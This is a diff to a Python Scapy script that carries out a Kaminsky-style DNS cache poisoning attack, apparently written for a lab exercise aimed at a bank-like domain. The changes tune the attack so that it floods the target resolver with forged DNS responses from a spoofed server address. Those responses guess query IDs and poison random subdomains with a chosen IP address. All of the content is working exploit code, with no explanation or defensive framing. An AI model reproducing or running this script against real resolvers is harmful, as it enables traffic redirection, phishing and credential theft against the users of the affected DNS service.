@@ -46,7 +46,7 @@ SPOOFED_DNS = "10.0.0.1"
 URL_TO_POISON = "bankofallan.co.uk"
 DNS_URL_BADGUY = "badguy.ru"
 
-NUMBER_OF_PACKETS = 20  # number of packets per attempt
+NUMBER_OF_PACKETS = 50  # number of packets per attempt
 TIME_SLEEP_SECONDS = 3  # seconds of delay before attack
 
 ATTACK_GOING_ON = True
@@ -77,15 +77,11 @@ def dns_server_routine():
                                                                                        an=dns_answer)
         send(res_packet, verbose=0)
         print(DNS_ROUTINE_HEADER + "Response sent! starting attack thread")
-        random_url = randomize_url(6) + URL_TO_POISON
+
         bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat,
-                                           args=[target_port, first_query_id, random_url])
+                                           args=[target_port, first_query_id])
         print(DNS_ROUTINE_HEADER + "Bite the rat!")
         bite_rat_thread.start()
-        dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=DNSQR(qname=random_url))
-        time.sleep(TIME_SLEEP_SECONDS / 2)
-        print(DNS_ROUTINE_HEADER + "Send malicious request...")
-        send(dns_malicious_req, verbose=0)
         bite_rat_thread.join()
 
 
@@ -95,24 +91,24 @@ def randomize_url(url_length=3):
 
 
 def random_query_id(last_query_id, seed=0):
-    last_query_id += randint(1, 200 + seed)
+    last_query_id += randint(1, 500 + seed)
     return last_query_id % 65536  # 16 bit maximum delimiter of query_id's DNS field
 
 
-def bite_the_rat(target_port_sniffed, query_id, random_url):
+def bite_the_rat(target_port_sniffed, query_id):
     """
     Attack function.
 
 
     """
-    query_id = random_query_id(query_id, 250)
-
-    last_query_id = query_id
+    query_id = random_query_id(query_id, 50)  # after badguy.ru req we notice there's an increase of queryid
     for j in range(NUMBER_OF_PACKETS):
         # since we've to guess the new query id we define an incremental pseudo random generator
-        guess_query_id = random_query_id(last_query_id)
+        random_url = randomize_url(query_id % 6) + URL_TO_POISON
+        guess_query_id = random_query_id(query_id)
         dns_record_req = DNSQR(qname=random_url, qtype="A")
         dns_answer = DNSRR(rrname=random_url, type="A", ttl=60000, rclass="IN", rdata="192.168.56.1")
+        dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=dns_record_req)
         attack_res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port_sniffed) / DNS(id=guess_query_id,
                                                                                                       qr=1,
                                                                                                       aa=0,
@@ -120,8 +116,10 @@ def bite_the_rat(target_port_sniffed, query_id, random_url):
                                                                                                       rcode=0,
                                                                                                       qd=dns_record_req,
                                                                                                       an=dns_answer)
+        print(BITE_THE_RAT_HEADER + "Send malicious request # " + str(j) + "...")
+        send(dns_malicious_req, verbose=0)
         send(attack_res_packet, verbose=0)
-        print(BITE_THE_RAT_HEADER + "Packet # " + str(j) + ", queryid: " +
+        print(BITE_THE_RAT_HEADER + "Attack packet # " + str(j) + ", queryid: " +
               str(attack_res_packet.getlayer(DNS).id) + ", random_url: \"" + random_url + "\" ")
 
     print(BITE_THE_RAT_HEADER + "End attempt")
